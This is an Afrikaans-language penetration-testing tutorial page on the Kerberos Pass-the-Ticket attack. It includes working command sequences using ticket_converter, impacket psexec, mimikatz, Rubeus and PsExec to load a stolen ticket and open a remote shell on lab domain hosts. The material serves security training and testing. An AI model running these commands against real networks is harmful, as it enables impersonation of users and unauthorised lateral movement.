# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

In die **Pass The Ticket (PTT)**-aanvalmetode **steel aanvallers 'n gebruiker se authentication ticket** in plaas van hul password of hash values. Hierdie gesteelde ticket word dan gebruik om **die gebruiker na te boots**, wat ongemagtigde toegang tot resources en services binne 'n netwerk verleen.<sup>[[1]](#references)</sup>

**Lees**:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Linux- en Windows-tickets tussen platforms uitruil**

Die [**ticket_converter**](https://github.com/Zer1t0/ticket_converter)-tool converteer ticket-formate deur slegs die ticket self en 'n output file te gebruik.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
In Windows kan [Kekeo](https://github.com/gentilkiwi/kekeo) gebruik word.

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Verwysings

- [1] [Kerberos (II): Hoe om Kerberos aan te val?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
